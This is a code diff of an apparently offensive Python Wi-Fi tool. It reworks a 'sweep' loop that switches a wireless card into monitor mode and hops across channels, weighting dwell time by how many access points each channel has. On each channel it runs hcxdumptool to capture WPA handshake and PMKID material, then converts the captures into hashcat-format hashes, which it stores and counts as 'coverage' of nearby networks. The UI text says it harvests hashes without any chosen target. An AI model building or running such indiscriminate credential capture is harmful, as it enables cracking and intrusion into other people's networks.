@@ -949,38 +949,55 @@ class App:
             self._running.clear()
 
     def _coverage(self):
-        scan = set()
+        hits = self._traffic_bssids()
+        full = set()
+        reach = set()
         for (_s, b, _c, g) in self.aps:
+            bl = b.lower()
+            full.add(bl)
             try:
                 if int(g) >= -75:
-                    scan.add(b.lower())
+                    reach.add(bl)
             except (TypeError, ValueError):
                 pass
-        if not scan:
-            return 0.0, 0, 0
-        hit = len(scan & self._traffic_bssids())
-        return 100.0 * hit / len(scan), hit, len(scan)
+        return full, reach, hits
 
-    def _sweep_round(self, ch):
-        dur = 140
+    def _sweep_round(self):
+        chans = {}
+        for (_s, _b, c, _g) in self.aps:
+            try:
+                c = int(c)
+            except (TypeError, ValueError):
+                continue
+            chans[c] = chans.get(c, 0) + 1
+        if not chans:
+            chans = {1: 1, 6: 1, 11: 1}
         script = (BIND +
-                  CH + 'rm -f /tmp/sw /tmp/sw.22000 2>/dev/null\n' +
+                  CH + 'rm -f /tmp/sw /tmp/sw_*.pcapng /tmp/sw.22000 '
+                     '2>/dev/null\n' +
                   CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
-                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
-                  CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 2\n' % ch +
-                  'timeout %d ' % dur +
-                  CH + 'hcxdumptool -i wlan0 -w /tmp/sw -t 10 --rds=2 2>/dev/null\n' +
-                  CH + 'hcxpcapngtool -o /tmp/sw.22000 /tmp/sw 2>/dev/null\n' +
-                  CH + 'cat /tmp/sw.22000 2>/dev/null\n')
+                  CH + 'ifconfig wlan0 up 2>/dev/null\n')
+        total = 0
+        for i, (c, n) in enumerate(sorted(chans.items())):
+            dwell = min(40, 10 + 5 * n)
+            total += dwell + 6
+            script += (CH + 'iw dev wlan0 set channel %d 2>/dev/null\n'
+                       'sleep 2\n' % c +
+                       'timeout %d ' % (dwell + 4) +
+                       CH + 'hcxdumptool -i wlan0 -w /tmp/sw_%d.pcapng '
+                            '-t %d --rds=2 2>/dev/null\n' % (i, dwell))
+        script += (CH + 'hcxpcapngtool -o /tmp/sw.22000 /tmp/sw_*.pcapng '
+                   '2>/dev/null\n' +
+                   CH + 'cat /tmp/sw.22000 2>/dev/null\n')
         try:
             with self._cap_lock:
                 r = subprocess.run(VM_SSH.split() + ['sh', '-s'],
                                    input=script.encode(), capture_output=True,
-                                   timeout=dur + 60)
+                                   timeout=total + 90)
             out = (r.stdout or b'').decode('utf-8', 'replace')
         except Exception as e:
-            self._ev('sweep', 'ch=%s err=%r' % (ch, e))
+            self._ev('sweep', 'cycle err=%r' % e)
             return 0
         lines = [l.strip() for l in out.splitlines() if l.startswith('WPA*')]
         pth = os.path.join(HASHSTORE, 'sweep_all.22000')
@@ -996,20 +1013,23 @@ class App:
             with open(pth, 'a') as f:
                 f.write('\n'.join(new) + '\n')
             self.hash_pool.update(new)
-        self._ev('sweep', 'ch=%s new=%d' % (ch, len(new)))
+        self._ev('sweep', 'cycle ch=%d new=%d' % (len(chans), len(new)))
         return len(new)
 
     def _sweep_loop(self):
         try:
             while not self._stop.is_set() and not self.target:
-                if self._stop.is_set() or self.target:
-                    break
                 try:
-                    self._sweep_round('hop')
-                    cov, hit, tot = self._coverage()
-                    self._ev('cov', 'pct=%.0f hit=%d tot=%d' % (cov, hit, tot))
-                    self.set_phase('scan', '巡掃全頻道（無目標自動收 hash）',
-                                   '🎯 可達覆蓋 %.0f%%（%d/%d）' % (cov, hit, tot))
+                    self._sweep_round()
+                    full, reach, hits = self._coverage()
+                    fh, rh = full & hits, reach & hits
+                    fp = 100.0 * len(fh) / len(full) if full else 0
+                    rp = 100.0 * len(rh) / len(reach) if reach else 0
+                    self._ev('cov', 'list=%.0f %d/%d reach=%.0f %d/%d'
+                             % (fp, len(fh), len(full), rp, len(rh), len(reach)))
+                    self.set_phase('scan', '加權巡掃（AP多頻道駐留久）',
+                                   '🎯 列表覆蓋 %.0f%%（%d/%d）'
+                                   % (fp, len(fh), len(full)))
                 except Exception as e:
                     self._ev('sweep', 'loop err=%r' % e)
                 time.sleep(3)
